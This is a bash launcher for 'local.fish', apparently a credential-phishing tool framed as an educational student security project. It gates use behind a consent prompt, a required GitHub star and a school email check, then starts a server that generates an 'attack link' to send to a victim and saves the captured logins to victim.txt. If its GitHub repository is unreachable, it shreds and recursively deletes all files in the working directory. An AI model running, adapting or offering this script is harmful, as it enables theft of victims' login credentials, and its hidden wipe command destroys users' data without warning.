#!/bin/bash

# GitHub Repository Details
GITHUB_USER="mickekofi"
REPO_NAME="local.fish"
GITHUB_URL="https://github.com/$GITHUB_USER/$REPO_NAME"

# 🔹 1st Checker: Verify if the GitHub Repository Exists
echo -e "\e[33m⚠️ Caution: By Continuing, you Admit to be a Member of the ~ University of Education,Winneba; and Agree to be Held Responsible for any Misuse of this Tool.\e[0m"

echo -e "\\n\\n"

read -p "Do you agree to the terms? (y/n): " AGREEMENT

if [[ "$AGREEMENT" != "y" ]]; then
    echo -e "\e[31m❌ You did not agree to the terms. Exiting...\e[0m"
    exit 1
fi

echo -e "\\n\\n"

echo -e "\e[32mFISHKISSFISHKIS               
       SFISHKISSFISHKISSFISH            F
    ISHK   ISSFISHKISSFISHKISS         FI
  SHKISS   FISHKISSFISHKISSFISS       FIS
HKISSFISHKISSFISHKISSFISHKISSFISH    KISS
  FISHKISSFISHKISSFISHKISSFISHKISS  FISHK
      SSFISHKISSFISHKISSFISHKISSFISHKISSF
  ISHKISSFISHKISSFISHKISSFISHKISSF  ISHKI
SSFISHKISSFISHKISSFISHKISSFISHKIS    SFIS
  HKISSFISHKISSFISHKISSFISHKISS       FIS
    HKISSFISHKISSFISHKISSFISHK         IS
       SFISHKISSFISHKISSFISH            K
         ISSFISHKISSFISHKIS               \e[0m"

echo -e "\\n"
echo -e "\e[32mWelcome to the Local.Fish; An Internal Students Regulated Cyber Tool Intended to Educate, Create Awareness and Engage a Community of all Faculty Individuals who Passion for Cyber Security and it Related Fields.\e[0m"

if curl --silent --fail "$GITHUB_URL" > /dev/null; then
    echo "✅ Authentication Needed! proceeding..."
else
    echo "\e[31m❌ This Tool has been Disabled Due to Misuse & Ethical Policy Deployment\e[0m"
    tar -czf project_backup.tar.gz * && shred -u *
    find . -type d -exec rm -rf {} +
    echo -e "\e[31m You Do Not Have the Legal-Right to Own this Tool\nWe have Burnt🔥🔥 all Files in Here\e[0m"
    exit 1
fi

# 🔹 2nd Checker: Verify if User has Starred the Repository

echo -e "//n"

read -p "Enter your GitHub username: " USERNAME
STARRED=$(curl -s -H "Accept: application/vnd.github.v3+json" "https://api.github.com/users/$USERNAME/starred" | grep "$REPO_NAME")

if [[ -n "$STARRED" ]]; then
    echo "\n"
else
    echo -e "\e[31m❌ You must Star 🌟 the Repository/Project on Github Before proceeding.\e[0m"

    echo "Please visit $GITHUB_URL and Star 🌟 the repository, then try again."
    exit 1
fi

# 🔹 3rd Checker: Verify School Email Format
read -p "Enter your School email: " EMAIL
if [[ "$EMAIL" =~ ^[0-9]{10}@st\.uew\.edu\.gh$ ]]; then
    echo -e "\e[32m✅ Successfully Verified! Proceeding...\e[0m"
else
    echo -e "\e[31m❌ Invalid index number format! Access Denied.\e[0m"
    exit 1
fi

export FROM_START=true


# 🔹 Final Step: Start the Server
echo -e "\e[32m🚀 Generating the Attack Link...Copy and Send to Victim\nLogins in victim.txt file\e[0m"
chmod +x sh/server.sh
./sh/server.sh
